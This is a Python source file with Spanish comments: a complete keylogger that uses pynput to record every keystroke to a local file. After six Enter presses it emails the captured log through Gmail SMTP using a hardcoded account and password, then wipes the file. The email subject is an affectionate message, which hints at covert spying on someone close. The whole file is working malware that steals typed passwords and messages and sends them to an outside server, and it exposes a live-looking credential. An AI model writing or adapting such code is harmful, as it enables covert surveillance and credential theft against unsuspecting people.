"""
Created on Mon Aug 1 13:54 2022
@author: Irvi3ngg
"""
from pynput.keyboard import Listener                      #Importamos libreria para registrar teclas presionadas
import datetime, smtplib, ssl
from email.message import EmailMessage

file_name="logeos3.txt"                                   #Definimos nombre del archivo en una variable
count = 0

def key_listener():                                       #Función principal
    def key_recorder(key):                                #Función que se activa al presionar una tecla
        global count
        key=str(key)                                      #La tecla registrada la convertimos a string
        print(key)                                        #Imprimimos en pantalla la tecla
        write_file(key)                                   #Llamamos a la función que escribe en un archivo lo registrado
        if key == 'Key.enter':
            count += 1
            print (count)
            if count >= 6:
                EnviarEmail()
                count = 0
        if key == "Key.insert":                           #Si la tecla presionada es insert salimos 
            print('Saliendo del keylogger...')
            quit()
    with Listener(on_press = key_recorder) as listener:   #Utilizamos libreria Listener con sentencia with, indicamos que funcion se activa al presonar tecla
        listener.join()                                   #Comenzamos a escuchar las teclas presionadas


def write_file(keys):                                     #Función para la escritura en archivo de teclas registradas    
    with open(file_name,'a') as f:                        #Con with utilizamos sentencia open para comenzar a escribir en archivo, indicamos 'a' para agregar nuevo texto y que no se borre el existente
        if keys == "Key.enter":                           #Si la tecla presionada es enter, sustituimos para salto de linea
            f.write(' -->\n')
        elif keys == 'Key.space':
            f.write(keys.replace('Key.space', ' '))
        elif keys == 'Key.backspace':
            f.write(keys.replace('Key.backspace', '/del/'))
        elif keys == 'Key.shift':
            f.write(keys.replace('Key.shift', '(mayusq)'))
        elif keys == 'Key.ctrl_l':
            f.write(keys.replace('Key.ctrl_l', '(ctrl)'))
        elif keys == 'Key.insert':
            f.write(keys.replace('Key.insert', ' \n\nSaliendo del keylogger3...'))
        else:
            f.write(keys.replace("'", ""))

def EnviarEmail():
    with open(file_name, 'r+') as file:
        fecha = datetime.datetime.now().strftime("%H:%M:%S %d-%m-%Y")
        data = file.read()
        data = 'Log capturado a las: ' + fecha + '\n\n' + data
        crearEmail('pruebb7@gmail.com','qwrtbsycipmqqbyn','pruebb7@gmail.com',"Aqui tienes mi amor, eres el mejor!! --> " + fecha, data)
        file.seek(0)
        file.truncate()

def crearEmail(user,passw,recep,subj,body):
    email_passw = passw
    email_emisor = user
    email_receptor = recep
    asunto = subj
    cuerpo = body
    em = EmailMessage()
    em['From'] = email_emisor
    em['To'] = email_receptor
    em['Subject'] = asunto
    em.set_content(cuerpo)
    contexto = ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com',465,context=contexto) as smtp:
        smtp.login(email_emisor, email_passw)
        smtp.sendmail(email_emisor, email_receptor, em.as_string())
        smtp.close()

if __name__ == '__main__':
    key_listener()